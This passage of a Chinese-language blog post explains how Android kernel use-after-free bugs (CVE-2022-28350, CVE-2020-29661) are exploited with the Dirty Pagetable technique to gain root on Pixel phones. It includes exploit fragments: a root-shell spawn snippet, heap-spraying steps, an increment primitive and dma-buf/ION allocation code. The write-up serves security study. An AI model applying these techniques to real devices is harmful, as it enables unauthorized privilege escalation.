<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if (setresuid(0, 0, 0) &lt; 0) &#123;</span><br><span class="line">    perror(&quot;setresuid&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if (setresgid(0, 0, 0) &lt; 0) &#123;</span><br><span class="line">        perror(&quot;setresgid&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        printf(&quot;[+] Spawn a root shell\n&quot;);</span><br><span class="line">        system(&quot;/system/bin/sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最终在Google Pixel 7上成功提权：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/pic13_pixel7_root.png"
                      alt="pic13_pixel7_root"
                ></p>
<h2 id="CVE-2022-28350-file-UAF-DirtyPTE"><a href="#CVE-2022-28350-file-UAF-DirtyPTE" class="headerlink" title="CVE-2022-28350 - file UAF | DirtyPTE"></a>CVE-2022-28350 - file UAF | DirtyPTE</h2><h3 id="file-UAF现有利用方法"><a href="#file-UAF现有利用方法" class="headerlink" title="file UAF现有利用方法"></a>file UAF现有利用方法</h3><p>file UAF漏洞最近比较流行，主要有3种利用方法：</p>
<ul>
<li>（1）获取已释放的受害者<code>file</code>对象，供新打开的特权文件重用，例如<code>/etc/crontab</code>，之后就能写入特权文件提权。Jann Horn[1]、Mathias Krause[5]、Zhenpeng  Lin[6]和作者[7]用到了本方法。缺点有3个，一是在新内核上必须赢得竞争，有一定技巧性和概率性；二是Android上无法写入高权限文件，因为这些文件位于只读文件系统中；三是无法逃逸容器。</li>
<li>（2）攻击系统库或可执行文件的页缓存， Xingyu Jin、Christian Resell、Clement Lecigne、Richard Neal[8] 和 Mathias  Krause[9]用到了本方法。利用该方法可向libc.so等系统库中注入恶意代码，当特权进程执行libc.so时将以特权用户的身份执行恶意代码，利用结果类似于DirtyPipe。优点是不需要竞争，稳定性较好，但是要想在Android上完整提权或逃逸容器还很复杂，且不适用于其他类型的UAF漏洞。</li>
<li>（3）Cross-cache 利用。Yong Wang[10] 和 Maddie Stone[11] 都用到了本方法。提权之前都需要绕过KASLR，Yong Wang[10]  通过重复使用 syscall 代码来猜测 kslides 绕过了KASLR，Maddie Stone[11]  通过另一个信息泄露漏洞绕过了KASLR。绕过KASLR之后，他们伪造了一个<code>file</code>对象来构造内核读写原语。缺点是需要绕过KASLR。</li>
</ul>
<h3 id="脏页表方法利用file-UAF"><a href="#脏页表方法利用file-UAF" class="headerlink" title="脏页表方法利用file UAF"></a>脏页表方法利用file UAF</h3><p>以CVE-2022-28350和内核版本为5.10的Android为例，介绍Dirty Pagetable的工作原理。</p>
<p><strong>介绍</strong>：位于ARM Mali GPU驱动中的 file UAF 漏洞，影响Android 12 和 Android 13。漏洞原因如下。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">kbase_kcpu_fence_signal_prepare</span><span class="params">(...)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/* create a sync_file fd representing the fence */</span></span><br><span class="line">    sync_file = sync_file_create(fence_out); <span class="comment">//&lt;------ 创建 file 对象</span></span><br><span class="line">    <span class="keyword">if</span> (!sync_file) &#123;</span><br><span class="line">        ...</span><br><span class="line">        ret = -ENOMEM;</span><br><span class="line">        <span class="keyword">goto</span> file_create_fail;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = get_unused_fd_flags(O_CLOEXEC); <span class="comment">//&lt;------ 获取未使用的 fd</span></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        ret = fd;</span><br><span class="line">        <span class="keyword">goto</span> fd_flags_fail;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd_install(fd, sync_file-&gt;file); <span class="comment">//&lt;------ 将 file 对象和 fd 关联起来</span></span><br><span class="line"></span><br><span class="line">    fence.basep.fd = fd;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(u64_to_user_ptr(fence_info-&gt;fence), &amp;fence,</span><br><span class="line">            <span class="keyword">sizeof</span>(fence))) &#123;</span><br><span class="line">        ret = -EFAULT;</span><br><span class="line">        <span class="keyword">goto</span> fd_flags_fail; <span class="comment">//&lt;------ 进入本分支</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fd_flags_fail:</span><br><span class="line">    fput(sync_file-&gt;file); <span class="comment">//&lt;------ 释放 file 对象</span></span><br><span class="line">file_create_fail:</span><br><span class="line">    dma_fence_put(fence_out);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可见，调用 <code>fd_install()</code> 将 <code>file</code> 对象与 fd 关联起来。通过<code>copy_to_user()</code>将fd传递到用户空间，但如果拷贝失败，将释放 <code>file</code> 对象，导致一个有效的fd和已释放的<code>file</code>对象关联起来：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241212141229425.png"
                      alt="image-20241212141229425"
                ></p>
<h4 id="回收受害者slab"><a href="#回收受害者slab" class="headerlink" title="回收受害者slab"></a>回收受害者slab</h4><p>释放受害者slab上所有对象后，页分配器会回收该slab。</p>
<h4 id="用户页表占据受害者slab-1"><a href="#用户页表占据受害者slab-1" class="headerlink" title="用户页表占据受害者slab"></a>用户页表占据受害者slab</h4><p>Android上 <code>filp</code> slab的大小是2-page，而用户页表大小是1-page。虽然二者大小不同，但是堆喷用户页表来占用受害者slab的成功率几乎是100%，占用成功后内存布局如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241212152733071.png"
                      alt="image-20241212152733071"
                ></p>
<h4 id="递增原语-定位受害者PTE对应的虚拟用户地址"><a href="#递增原语-定位受害者PTE对应的虚拟用户地址" class="headerlink" title="递增原语+定位受害者PTE对应的虚拟用户地址"></a>递增原语+定位受害者PTE对应的虚拟用户地址</h4><p><strong>递增原语</strong>：目的是构造写原语来篡改PTE。受害者file对象被用户页表所覆写，对该file对象进行操作可能导致内核崩溃。但是作者发现，<strong>调用 <code>dup()</code> 将file对象的<code>f_count</code>递增1</strong>，不会触发崩溃，问题是 <code>dup()</code> 会消耗fd资源，单个进程最多打开32768个fd，所以<code>f_count</code>最多递增32768。作者又发现<code>fork()+dup()</code>可突破该限制，先调用<code>fork()</code>，会将受害者file对象的<code>f_count</code>加1，子进程中可将<code>f_count</code>增加32768。由于可以多次重复<code>fork()+dup()</code>，所以成功突破限制。</p>
<p><strong>PTE与<code>f_count</code>重叠</strong>：下一步是让受害者PTE的位置与<code>f_count</code>重合，这样就能利用递增原语来控制PTE。</p>
<p>file对象的对齐大小为320字节，<code>f_count</code>的偏移是56，占8字节。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">(gdb) ptype /o <span class="class"><span class="keyword">struct</span> <span class="title">file</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>      |    <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line"><span class="comment">/*      0      |      16 */</span>    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="comment">/*                     8 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span> &#123;</span></span><br><span class="line"><span class="comment">/*      0      |       8 */</span>            <span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">                                       <span class="comment">/* total size (bytes):    8 */</span></span><br><span class="line">                                   &#125; fu_llist;</span><br><span class="line"><span class="comment">/*                    16 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line"><span class="comment">/*      0      |       8 */</span>            <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="comment">/*      8      |       8 */</span>            <span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *);</span><br><span class="line"></span><br><span class="line">                                       <span class="comment">/* total size (bytes):   16 */</span></span><br><span class="line">                                   &#125; fu_rcuhead;</span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):   16 */</span></span><br><span class="line">                               &#125; f_u;</span><br><span class="line"><span class="comment">/*     16      |      16 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">path</span> &#123;</span></span><br><span class="line"><span class="comment">/*     16      |       8 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">vfsmount</span> *<span class="title">mnt</span>;</span></span><br><span class="line"><span class="comment">/*     24      |       8 */</span>        <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span> *<span class="title">dentry</span>;</span></span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):   16 */</span></span><br><span class="line">                               &#125; f_path;</span><br><span class="line"><span class="comment">/*     32      |       8 */</span>    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">f_inode</span>;</span></span><br><span class="line"><span class="comment">/*     40      |       8 */</span>    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">f_op</span>;</span></span><br><span class="line"><span class="comment">/*     48      |       4 */</span>    <span class="type">spinlock_t</span> f_lock;</span><br><span class="line"><span class="comment">/*     52      |       4 */</span>    <span class="class"><span class="keyword">enum</span> <span class="title">rw_hint</span> <span class="title">f_write_hint</span>;</span></span><br><span class="line"><span class="comment">/*     56      |       8 */</span>    <span class="type">atomic_long_t</span> f_count;</span><br><span class="line"><span class="comment">/*     64      |       4 */</span>    <span class="type">unsigned</span> <span class="type">int</span> f_flags;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"><span class="comment">/*    288      |       8 */</span>    u64 android_oem_data1;</span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):  296 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure></div>

<p><code>filp</code> cache的slab大小为2-page，一个<code>filp</code> cache的slab中有25个<code>file</code>对象，slab的结构如下所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241212154726436.png"
                      alt="image-20241212154726436"
                ></p>
<p>由于受害者<code>file</code>对象有25个可能的位置，为确保受害者<code>file</code>对象的<code>f_count</code>和受害者PTE恰好重合，需准备如下用户页表：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241212155128279.png"
                      alt="image-20241212155128279"
                ></p>
<p><strong>识别PTE对应的用户虚拟地址</strong>：现在我们能使受害者file对象的<code>f_count</code>与一个有效的PTE重合了，这个有效的PTE就是受害者PTE。如何找到受害者PTE对应的用户虚拟地址呢？可利用递增原语。</p>
<p>在利用递增原语之前，页表和相应的用户虚拟地址应该如下所示：可以看到，为了区分每个用户虚拟地址对应的物理页，作者将虚拟地址写在每个物理页的前8字节，作为标记。由于用户虚拟地址对应的所有物理页都是一次性分配的，因此它们的物理地址很可能是连续的。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241212160223196.png"
                      alt="image-20241212160223196"
                ></p>
<p>如果我们利用递增原语将受害者PTE增加0x1000，就会改变与受害者PTE对应的物理页，如下所示：受害者PTE和另一个有效的PTE对应同一个物理页！现在可遍历所有虚拟页，检查前8字节是不是其虚拟地址，若不是，则该虚拟页就是受害者PTE对应的虚拟页。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241212161417467.png"
                      alt="image-20241212161417467"
                ></p>
<h4 id="堆喷占用页表"><a href="#堆喷占用页表" class="headerlink" title="堆喷占用页表"></a>堆喷占用页表</h4><p><strong>问题</strong>：现在找到了受害者PTE，且有递增原语。可将受害者PTE对应的物理地址设置为内核text&#x2F;data的物理地址，但是mmap() 分配的内存对应的物理地址大于内核text&#x2F;data的物理地址，而且递增原语有限，无法溢出受害者PTE。解决办法是使<strong>PTE指向某个用户页表，通过间接篡改用户页表，来篡改物理内存</strong>。</p>
<p><strong>策略 1</strong>：现在已经让受害者PTE和另一有效PTE指向同一物理页，那么如果我们调用<code>munmap()</code>解除另一有效PTE的虚拟页映射，并触发物理页的释放，会发生什么？page UAF！再用用户页表占据释放页，就能控制用户页表。但问题是，很难堆喷用户页表来占据释放页。原因是，<strong>匿名 <code>mmap()</code> 分配的物理页来自内存区的<code>MIGRATE_MOVABLE</code> free_area，而用户页表是从内存区的<code>MIGRATE_UNMOVABLE</code> free_area分配，所以很难通过递增PTE使之指向另一用户页表</strong>。参考[10]解释了这一点。</p>
<p><strong>策略 2</strong>：新策略能够捕获用户页表，步骤如下。本质是<strong>采用另一种方式来分配物理页，使该物理页和用户页表来自同一内存区域，这样如果受害者PTE指向该物理页，就能通过递增该PTE，使该PTE指向某个用户页表</strong>。</p>
<p><strong>（1）对共享页和用户页表进行 heap shaping</strong></p>
<p><strong>目的</strong>：由于共享页和用户页表位于同一种内存，可将共享页嵌入到众多用户页表当中。</p>
<p><strong>共享物理页</strong>：通常，内核空间和用户空间需要共享一些物理页，从两个空间都能访问到。有些组件可用于分配这些共享页，例如 dma-buf heaps, io_uring, GPUs 等。</p>
<p><strong>分配共享物理页</strong>：作者选用 dma-buf 系统堆来分配共享页，因为可以从Android中不受信任的APP来访问<code>/dev/dma_heap/system</code>，并且 dma-buf 的实现相对简单。通过 <code>open(/dev/dma_heap/system)</code> 可获得一个 dma heap fd，然后用以下代码分配一个共享页：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dma_heap_allocation_data</span> <span class="title">data</span>;</span></span><br><span class="line"></span><br><span class="line">data.len = <span class="number">0x1000</span>;</span><br><span class="line">data.fd_flags = O_RDWR;</span><br><span class="line">data.heap_flags = <span class="number">0</span>;</span><br><span class="line">data.fd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &amp;data) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;DMA_HEAP_IOCTL_ALLOC&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> dma_buf_fd = data.fd;</span><br></pre></td></tr></table></figure></div>

<p>由用户空间中的 <code>dma_buf</code> fd来表示一个共享页，可通过<code>mmap()</code> dma_buf fd 将共享页映射到用户空间。从 dma-buf 系统堆分配的共享页本质上是从页分配器分配的（实际上 dma-buf 子系统采用了页面池进行优化，对于本利用没有影响）。用于分配共享页的 <code>gfp_flags</code> 如下所示：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HIGH_ORDER_GFP  (((GFP_HIGHUSER | __GFP_ZERO | __GFP_NOWARN \ 	<span class="comment">// HIGH_ORDER_GFP 用于 order-8和order-4 page</span></span></span><br><span class="line">                | __GFP_NORETRY) &amp; ~__GFP_RECLAIM) \</span><br><span class="line">                | __GFP_COMP)</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOW_ORDER_GFP (GFP_HIGHUSER | __GFP_ZERO | __GFP_COMP) 			<span class="comment">// LOW_ORDER_GFP 用于 order-0 page</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">gfp_t</span> order_flags[] = &#123;HIGH_ORDER_GFP, HIGH_ORDER_GFP, LOW_ORDER_GFP&#125;;</span><br></pre></td></tr></table></figure></div>

<p><strong>共享页分配vs页表分配</strong>：从<code>LOW_ORDER_GFP</code>可以看出，单个共享页是从内存的<code>MIGRATE_UNMOVABLE</code> free_area中分配的，和页表分配的出处一样。且单个共享页为order-1 （order-0 ?），和页表的order相同。结论是，<strong>单个共享页和页表都是从同一<code>migrate</code> free_cache中分配，且order相同</strong>。</p>
<p>通过以下步骤，就能获得下图中单个共享页和用户页表的布局：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">step1：分配<span class="number">3200</span>个用户页表</span><br><span class="line">step2：使用dma-buf系统堆分配单个共享页面</span><br><span class="line">step3：分配<span class="number">3200</span>个用户页表</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241213101331895.png"
                      alt="image-20241213101331895"
                ></p>
<p><strong>（2）取消与受害者 PTE 对应的虚拟地址的映射，并将共享页映射到该虚拟地址</strong></p>
<p><strong>目标</strong>：由于共享页和页表位于同种内存，所以需要将受害者PTE从原先的物理页映射到共享物理页。</p>
<p><strong>方法</strong>：可通过<code>mmap()</code> dma_buf fd 将共享页映射到用户空间，因此可先<code>munmap()</code> 受害者PTE对应的虚拟地址，然后将单个共享页映射到该虚拟地址。如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241213115619059.png"
                      alt="image-20241213115619059"
                ></p>
<p><strong>（3）利用递增原语捕获用户页表</strong></p>
<p>现在，我们利用递增原语对受害者PTE增加0x1000、0x2000、0x3000，有很大机率使受害者PTE对应到另一用户页表。如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241213115657335.png"
                      alt="image-20241213115657335"
                ></p>
<p>现在已经控制了一个用户页表。通过修改用户页表中的PTE，就能修改内核 text&#x2F;data，即可提权：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/pic23_file_uaf_root.jpg"
                      alt="pic23_file_uaf_root"
                ></p>
<h2 id="CVE-2020-29661-pid-UAF-DirtyPTE"><a href="#CVE-2020-29661-pid-UAF-DirtyPTE" class="headerlink" title="CVE-2020-29661 - pid UAF |  DirtyPTE"></a>CVE-2020-29661 - pid UAF |  DirtyPTE</h2><p><strong>介绍</strong>：CVE-2020-29661属于pid UAF漏洞，已被Jann Horn[12]和Yong  Wang[10]利用。Jann  Horn在Debian上通过控制用户页表来修改只读文件（例如，setuid二进制文件）的页缓存，缺点是无法逃逸容器，且不能绕过Android上的SELinux防护。</p>
<p>作者采用Dirty Pagetable的方法重新利用了CVE-2020-29661，能在含有内核4.14的Google Pixel 4上提权。pid UAF 和 file UAF 都使用类似的增递增原语来操作 PTE。以下只介绍关键步骤。</p>
<h3 id="脏页表方法利用CVE-2020-29661"><a href="#脏页表方法利用CVE-2020-29661" class="headerlink" title="脏页表方法利用CVE-2020-29661"></a>脏页表方法利用CVE-2020-29661</h3><p>与file UAF类似，在触发CVE-2020-29661并释放受害者slab中的所有其他pid对象后，用用户页表占用受害者slab。如下图所示，受害者pid对象位于用户页表中：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/image-20241213120838440.png"
                      alt="image-20241213120838440"
                ></p>
<h4 id="利用pid-UAF构造递增原语"><a href="#利用pid-UAF构造递增原语" class="headerlink" title="利用pid UAF构造递增原语"></a>利用pid UAF构造递增原语</h4><p><strong>目标</strong>：利用递增原语篡改受害者PTE。</p>
<p>选取受害者pid对象的<code>count</code>成员与有效PTE重合，<code>count</code>位于pid对象的前4字节（8字节对齐）：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">refcount_t</span> count; <span class="comment">//&lt;------------- 4 bytes, aligned with 8</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> level;</span><br><span class="line">    <span class="type">spinlock_t</span> lock;</span><br><span class="line">    <span class="comment">/* lists of tasks that use this pid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span> <span class="title">tasks</span>[<span class="title">PIDTYPE_MAX</span>];</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span> <span class="title">inodes</span>;</span></span><br><span class="line">    <span class="comment">/* wait queue for pidfd notifications */</span></span><br><span class="line">    <span class="type">wait_queue_head_t</span> wait_pidfd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">upid</span> <span class="title">numbers</span>[1];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>尽管 <code>count</code> 字段只有4字节，但是与PTE的低4字节重合。Jann horn[12] 之前基于 <code>count</code> 构造了递增原语，但是限制也是由于fd资源有限，可通过 <code>fork()</code> 在多个进程中执行递增原语，突破限制。</p>
<h4 id="分配共享页"><a href="#分配共享页" class="headerlink" title="分配共享页"></a>分配共享页</h4><p>内核4.14中没有 dma-buf，可通过ION来分配共享页，ION更加方便，因为可通过设置ION的flag直接从页分配器分配共享页。分配代码如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> LEGACY_ION</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_pages_from_ion</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ion_allocation_data</span> <span class="title">data</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;data, <span class="number">0</span>, <span class="keyword">sizeof</span>(data));</span><br><span class="line"></span><br><span class="line">    data.heap_id_mask = <span class="number">1</span> &lt;&lt; ION_SYSTEM_HEAP_ID;</span><br><span class="line">    data.len = <span class="number">0x1000</span>*num;</span><br><span class="line">    data.flags = ION_FLAG_POOL_FORCE_ALLOC;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(ion_fd, ION_IOC_ALLOC, &amp;data) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;ioctl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ion_fd_data</span> <span class="title">fd_data</span>;</span></span><br><span class="line">    fd_data.handle = data.handle;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(ion_fd, ION_IOC_MAP, &amp;fd_data) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;ioctl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> dma_buf_fd = fd_data.fd;</span><br><span class="line">    <span class="keyword">return</span> dma_buf_fd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_pages_from_ion</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ion_allocation_data</span> <span class="title">data</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;data, <span class="number">0</span>, <span class="keyword">sizeof</span>(data));</span><br><span class="line"></span><br><span class="line">    data.heap_id_mask = <span class="number">1</span> &lt;&lt; ION_SYSTEM_HEAP_ID;</span><br><span class="line">    data.len = <span class="number">0x1000</span>*num;</span><br><span class="line">    data.flags = ION_FLAG_POOL_FORCE_ALLOC;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(ion_fd, ION_IOC_ALLOC, &amp;data) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;ioctl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dma_buf_fd = data.fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dma_buf_fd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>共享页由用户空间中的<code>dma_buf_fd</code> 表示，可通过 <code>mmap()</code> dma_buf_fd 将共享页映射到用户空间。</p>
<h4 id="Google-Pixel-4提权"><a href="#Google-Pixel-4提权" class="headerlink" title="Google Pixel 4提权"></a>Google Pixel 4提权</h4><p>成功提权：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/10/22/Android%E5%AE%89%E5%85%A8-%E5%86%85%E6%A0%B8%E7%AF%87/pic25_root_pixel4.png"
                      alt="pic25_root_pixel4"
                ></p>
